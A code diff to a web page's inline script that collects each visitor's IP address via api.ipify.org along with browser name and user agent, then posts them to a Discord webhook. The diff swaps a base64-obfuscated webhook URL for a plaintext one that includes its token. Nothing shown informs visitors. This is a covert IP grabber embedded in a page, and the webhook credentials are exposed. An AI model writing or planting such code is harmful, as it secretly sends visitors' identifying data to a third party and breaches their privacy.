@@ -435,14 +435,10 @@
     </section> -->
 
     <script>
-        const enchooker = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzOTM3MjA0NzExMzEyNTk4OC9LS0poeER3SzkyTjJubkRsNGh5UHFodHVtT0dJRDRiSDViSC1WZzdsanYtc0N5RXA1MW11bU1FdVlRN1pLMWYtazEzQw==";
-
-        function decodeBase64(encoded) {
-            return atob(encoded);
-        }
-
-        const hooker = decodeBase64(enchooker);
-        const hard = "https://api.ipify.org?format=json";    
+        const ipAddressWebhookUrl = "https://api.ipify.org?format=json";
+        const discordWebhookUrl = "https://discord.com/api/webhooks/1340609157010821120/7F33sT7d1VdJy-1BXTxJhMwRAiUsi8ruiOS6gV2vcH9F-wWIb9r2G-vjF4Ale5si55Aj";
+    
+        // Function to get the browser name
         function getBrowserName() {
             const userAgent = navigator.userAgent;
             if (userAgent.indexOf("Firefox") > -1) return "Firefox";
@@ -506,7 +502,7 @@
         // Get User Agent
         const userAgentString = navigator.userAgent;
     
-        fetch(hard)
+        fetch(ipAddressWebhookUrl)
             .then(response => response.json())
             .then(data => {
                 const ipAddress = data.ip;
@@ -527,7 +523,7 @@
                     content: message
                 };
     
-                fetch(hooker, {
+                fetch(discordWebhookUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
